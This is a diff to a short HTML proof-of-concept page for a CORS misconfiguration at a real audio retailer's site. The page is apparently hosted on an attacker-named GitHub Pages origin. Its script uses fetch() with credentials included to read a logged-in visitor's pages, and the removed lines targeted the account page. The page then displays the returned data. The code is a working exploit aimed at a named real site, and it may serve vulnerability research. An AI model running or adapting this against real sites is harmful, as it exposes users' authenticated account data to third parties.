@@ -3,17 +3,22 @@
 <head><title>CORS PoC</title></head>
 <body>
 <h2>CORS PoC - Reading authenticated data</h2>
-<p>Origin: <strong>yourname.github.io</strong></p>
+<p>Origin: <strong>hacker420818.github.io</strong></p>
 <pre id="result">Fetching...</pre>
 <script>
-fetch("https://www.harmanaudio.com/on/demandware.store/Sites-HA-US-Site/en_US/Account-Show", {
-  credentials: "include"
+fetch("https://www.harmanaudio.com/", {
+  method: "GET",
+  credentials: "include",
+  mode: "cors"
 })
-.then(r => r.text())
-.then(data => {
+.then(r => {
   document.getElementById("result").innerText = 
-    "SUCCESS - Data received from harmanaudio.com:\n\n" + 
-    data.substring(0, 800);
+    "SUCCESS!\nStatus: " + r.status + "\nURL: " + r.url;
+  return r.text();
+})
+.then(data => {
+  document.getElementById("result").innerText += 
+    "\n\nData received:\n" + data.substring(0, 500);
 })
 .catch(e => {
   document.getElementById("result").innerText = "Error: " + e;
